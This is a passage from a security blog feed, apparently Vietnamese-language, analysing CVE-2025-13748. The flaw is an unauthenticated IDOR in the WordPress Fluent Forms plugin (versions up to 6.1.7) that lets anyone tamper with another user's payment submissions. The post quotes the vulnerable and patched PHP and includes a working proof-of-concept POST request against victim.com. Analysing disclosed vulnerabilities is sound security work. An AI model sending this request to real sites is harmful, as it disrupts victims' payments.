id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/elex-helpdesk-customer-support-ticket-system/vulnerability/wordpress-elex-wordpress-helpdesk-customer-ticketing-system-plugin-3-2-9-authenticated-subscriber-insecure-direct-object-reference-via-eh-crm-ticket-single-view-client-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System Plugin &amp;lt;= 3.2.9 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-13748 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-27-cve-2025-13748/</link>
      <pubDate>Sat, 27 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-27-cve-2025-13748/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-27-cve-2025-13748/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Fluent Forms – Customizable Contact Forms, Survey, Quiz, &amp;amp; Conversational Form Builder&lt;/strong&gt; tồn tại &lt;strong&gt;lỗ hổng Insecure Direct Object Reference (IDOR)&lt;/strong&gt; trong tất cả các phiên bản &lt;strong&gt;≤ 6.1.7&lt;/strong&gt; thông qua tham số &lt;code&gt;submission_id&lt;/code&gt; trong endpoint xác nhận thanh toán SCA.&#xA;Lỗ hổng cho phép &lt;strong&gt;người dùng chưa xác thực&lt;/strong&gt; có thể &lt;strong&gt;đánh dấu submission của người khác là failed&lt;/strong&gt;, gây gián đoạn quá trình thanh toán.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13748&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13748&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.1.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.1.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/fluentform/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FluentForm Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;FluentForm&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.1.7&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.1.8&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký AJAX handler &lt;strong&gt;cho người chưa đăng nhập&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_nopriv_fluentform_sca_inline_confirm_payment&amp;#39;, [$this, &amp;#39;confirmScaPayment&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; là hook dành cho người dùng chưa đăng nhập (kể cả Unauthenticated). Khi có request tới endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=fluentform_sca_inline_confirm_payment&lt;/code&gt; thì callback &lt;code&gt;confirmScaPayment&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function confirmScaPayment()&#xA;{&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $formId = isset($_REQUEST[&amp;#39;form_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;form_id&amp;#39;]) : 0;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $submissionId = isset($_REQUEST[&amp;#39;submission_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;submission_id&amp;#39;]) : 0;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $paymentMethod = isset($_REQUEST[&amp;#39;payment_method&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;payment_method&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $paymentIntentId = isset($_REQUEST[&amp;#39;payment_intent_id&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;payment_intent_id&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;&#xA;    $this-&amp;gt;setSubmissionId($submissionId);&#xA;    $submission = $this-&amp;gt;getSubmission();&#xA;    $this-&amp;gt;form = $this-&amp;gt;getForm();&#xA;&#xA;    $transaction = $this-&amp;gt;getLastTransaction($submissionId);&#xA;&#xA;    $confirmation = SCA::confirmPayment($paymentIntentId, [&#xA;        &amp;#39;payment_method&amp;#39; =&amp;gt; $paymentMethod&#xA;    ], $formId);&#xA;&#xA;    if (is_wp_error($confirmation)) {&#xA;        $message = &amp;#39;Payment has been failed. &amp;#39; . $confirmation-&amp;gt;get_error_message();&#xA;        $this-&amp;gt;handlePaymentChargeError($message, $submission, $transaction, $confirmation, &amp;#39;payment_error&amp;#39;);&#xA;    }&#xA;&#xA;    if ($confirmation-&amp;gt;status == &amp;#39;succeeded&amp;#39;) {&#xA;        $charge = $confirmation-&amp;gt;charges-&amp;gt;data[0];;&#xA;        $this-&amp;gt;handlePaymentSuccess($charge, $transaction, $submission);&#xA;    } else {&#xA;        $this-&amp;gt;handlePaymentChargeError(&amp;#39;We could not verify your payment. Please try again&amp;#39;, $submission, $transaction, $confirmation, &amp;#39;payment_error&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong hàm &lt;code&gt;confirmScaPayment()&lt;/code&gt;, plugin lấy &lt;code&gt;submission_id&lt;/code&gt; trực tiếp từ request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$submissionId = isset($_REQUEST[&amp;#39;submission_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;submission_id&amp;#39;]) : 0;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Giá trị này:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Không được ràng buộc với user hiện tại&lt;/li&gt;&#xA;&lt;li&gt;Không được kiểm tra ownership&lt;/li&gt;&#xA;&lt;li&gt;Không được kiểm tra mối quan hệ với &lt;code&gt;form_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tức là bất kỳ ai gửi request đến endpoint đều có thể chỉ định bất kỳ submission nào tồn tại trong database.&lt;/p&gt;&#xA;&lt;p&gt;Sau khi lấy &lt;code&gt;submission_id&lt;/code&gt;, hệ thống tiếp tục:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;setSubmissionId($submissionId);&#xA;$submission = $this-&amp;gt;getSubmission();&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ở đây xảy ra điều cốt lõi của IDOR: Object (submission) được truy xuất trực tiếp bằng ID do user kiểm soát, mà không có bất kỳ lớp kiểm soát truy cập nào.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Không có bất kỳ logic nào như:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($submission-&amp;gt;user_id !== get_current_user_id()) {&#xA;    deny_access();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hay:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($submission-&amp;gt;form_id !== $formId) {&#xA;    deny_access();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này dẫn đến việc: Submission của user A có thể bị thao tác bởi người chưa đăng nhập.&lt;/p&gt;&#xA;&lt;p&gt;Ở bản vá, toàn bộ request phải vượt qua bước xác thực:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-27-cve-2025-13748/patch.png&#34; title=&#34;Bản vá&#34; data-thumbnail=&#34;/posts/2025-12-27-cve-2025-13748/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-27-cve-2025-13748/patch.png&#39; alt=&#34;Patch&#34; height=&#34;447&#34; width=&#34;1875&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function validateScaRequest($submissionId, $paymentIntentId, $submission = null, $transaction = null)&#xA;{&#xA;    $strictMode = apply_filters(&amp;#39;fluentform/stripe_sca_strict_security&amp;#39;, false);&#xA;    $warnings = [];&#xA;&#xA;    // Validate nonce (optional in non-strict mode for backward compatibility)&#xA;    $nonce = isset($_REQUEST[&amp;#39;_ff_stripe_nonce&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;_ff_stripe_nonce&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;    &#xA;    if ($nonce) {&#xA;        $nonceAction = &amp;#39;fluentform_sca_confirm_&amp;#39; . $submissionId;&#xA;        if (!wp_verify_nonce($nonce, $nonceAction)) {&#xA;            $error = __(&amp;#39;Security verification failed. Invalid nonce.&amp;#39;, &amp;#39;fluentform&amp;#39;);&#xA;            if ($strictMode) {&#xA;                return new \WP_Error(&amp;#39;invalid_nonce&amp;#39;, $error);&#xA;            }&#xA;            $warnings[] = &amp;#39;Invalid nonce provided&amp;#39;;&#xA;        }&#xA;    } else {&#xA;        $warning = &amp;#39;No nonce provided for SCA payment confirmation&amp;#39;;&#xA;        if ($strictMode) {&#xA;            return new \WP_Error(&amp;#39;missing_nonce&amp;#39;, __(&amp;#39;Security verification failed. Nonce required.&amp;#39;, &amp;#39;fluentform&amp;#39;));&#xA;        }&#xA;        $warnings[] = $warning;&#xA;    }&#xA;&#xA;    // Validate submission exists&#xA;    if (!$submission || !$submission-&amp;gt;id) {&#xA;        return new \WP_Error(&amp;#39;invalid_submission&amp;#39;, __(&amp;#39;Invalid submission.&amp;#39;, &amp;#39;fluentform&amp;#39;));&#xA;    }&#xA;&#xA;&#xA;    if ($submission-&amp;gt;payment_status === &amp;#39;paid&amp;#39;) {&#xA;        return new \WP_Error(&#xA;            &amp;#39;already_paid&amp;#39;,&#xA;            __(&amp;#39;This payment has already been completed and cannot be modified.&amp;#39;, &amp;#39;fluentform&amp;#39;)&#xA;        );&#xA;    }&#xA;&#xA;    // stores it in transaction.charge_id, and frontend sends it back.&#xA;    // Mismatch only occurs during attack attempts.&#xA;    if ($transaction &amp;amp;&amp;amp; $transaction-&amp;gt;charge_id) {&#xA;        if ($transaction-&amp;gt;charge_id !== $paymentIntentId) {&#xA;            return new \WP_Error(&#xA;                &amp;#39;payment_intent_mismatch&amp;#39;,&#xA;                __(&amp;#39;Payment verification failed. Payment intent does not match.&amp;#39;, &amp;#39;fluentform&amp;#39;)&#xA;            );&#xA;        }&#xA;    }&#xA;&#xA;    // Log warnings for monitoring&#xA;    if (!empty($warnings) &amp;amp;&amp;amp; defined(&amp;#39;WP_DEBUG&amp;#39;) &amp;amp;&amp;amp; WP_DEBUG) {&#xA;        $logData = [&#xA;            &amp;#39;parent_source_id&amp;#39; =&amp;gt; $submission-&amp;gt;form_id,&#xA;            &amp;#39;source_type&amp;#39;      =&amp;gt; &amp;#39;submission_item&amp;#39;,&#xA;            &amp;#39;source_id&amp;#39;        =&amp;gt; $submission-&amp;gt;id,&#xA;            &amp;#39;component&amp;#39;        =&amp;gt; &amp;#39;Payment&amp;#39;,&#xA;            &amp;#39;status&amp;#39;           =&amp;gt; &amp;#39;warning&amp;#39;,&#xA;            &amp;#39;title&amp;#39;            =&amp;gt; __(&amp;#39;Stripe SCA Security Warning&amp;#39;, &amp;#39;fluentform&amp;#39;),&#xA;            &amp;#39;description&amp;#39;      =&amp;gt; implode(&amp;#39;; &amp;#39;, $warnings)&#xA;        ];&#xA;        do_action(&amp;#39;fluentform/log_data&amp;#39;, $logData);&#xA;    }&#xA;&#xA;    return [&#xA;        &amp;#39;valid&amp;#39;    =&amp;gt; true,&#xA;        &amp;#39;warnings&amp;#39; =&amp;gt; $warnings&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;validateScaRequest&lt;/code&gt; thực hiện:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kiểm tra &lt;code&gt;submission_id&lt;/code&gt; có tồn tại hợp lệ hay không&lt;/li&gt;&#xA;&lt;li&gt;Ngăn xử lý nếu submission đã được thanh toán&lt;/li&gt;&#xA;&lt;li&gt;Ràng buộc &lt;code&gt;payment_intent_id&lt;/code&gt; với transaction tương ứng&lt;/li&gt;&#xA;&lt;li&gt;Ngăn việc dùng payment intent giả mạo&lt;/li&gt;&#xA;&lt;li&gt;Thêm xác thực nonce cho request&lt;/li&gt;&#xA;&lt;li&gt;Ghi log khi phát hiện hành vi bất thường&lt;/li&gt;&#xA;&lt;li&gt;Chặn hoàn toàn việc thay đổi trạng thái submission trái phép&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Điều này đã kiểm soát chặt logic, khiến lỗi hổng IDOR không thể xảy ra.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Send request to admin-ajax.php?action=fluentform_sca_inline_confirm_payment&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Extract submission_id &amp;amp; payment_intent_id from request&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;No nonce validation&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Load submission by submission_id&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;No ownership or relationship check&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Load transaction using submission_id&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;No validation between payment_intent_id and transaction&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Process payment confirmation&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;Update submission status (success / failed)&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Attacker manipulates victim&amp;#39;s submission&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Gửi request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: victim.com&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;action=fluentform_sca_inline_confirm_payment&#xA;&amp;amp;submission_id=1024&#xA;&amp;amp;payment_method=card&#xA;&amp;amp;payment_intent_id=pi_fake&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng CVE-2025-13748 xuất phát từ việc &lt;strong&gt;tin tưởng dữ liệu đầu vào do client kiểm soát&lt;/strong&gt;, cụ thể là &lt;code&gt;submission_id&lt;/code&gt;, trong khi không có bất kỳ cơ chế kiểm soát quyền sở hữu hoặc xác thực ngữ cảnh nào. Endpoint xác nhận thanh toán được mở cho người chưa đăng nhập và cho phép thao tác trực tiếp lên submission mà không ràng buộc với user, form hay transaction hợp lệ.&lt;/p&gt;&#xA;&lt;p&gt;Việc thiếu kiểm tra ownership, thiếu ràng buộc giữa &lt;code&gt;payment_intent_id&lt;/code&gt; và transaction, cùng với việc không xác thực nguồn request đã tạo điều kiện cho kẻ tấn công &lt;strong&gt;thao túng trạng thái thanh toán của người khác&lt;/strong&gt;. Đây là một trường hợp điển hình của &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; phát sinh từ lỗi thiết kế logic nghiệp vụ, không phải lỗi kỹ thuật đơn lẻ.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã khắc phục triệt để bằng cách bổ sung nhiều lớp kiểm soát, xác thực và ràng buộc dữ liệu, từ đó loại bỏ hoàn toàn khả năng khai thác.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 